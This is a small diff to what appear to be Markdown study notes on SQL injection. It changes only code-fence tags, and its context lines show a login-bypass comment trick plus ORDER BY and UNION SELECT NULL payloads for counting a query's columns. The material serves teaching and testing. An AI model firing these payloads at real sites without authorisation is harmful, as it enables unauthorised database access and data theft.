@@ -70,7 +70,7 @@ SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
 
 In SQL, `ORDER BY x` is used to sort the results of a query based on the x column selected in the list of columns.
 
-```sql
+```
 ' order by 1-- -   
 ' order by 2-- -   
 ' order by 3-- -
@@ -81,7 +81,7 @@ In SQL, `ORDER BY x` is used to sort the results of a query based on the x colum
 
 ### **Using UNION**
 
-```sql
+```
 cn' UNION select NULL-- -                 #The used SELECT statements have a different number of columns
 cn' UNION select NULL,NULL-- -            #The used SELECT statements have a different number of columns
 cn' UNION select NULL,NULL,NULL-- -        
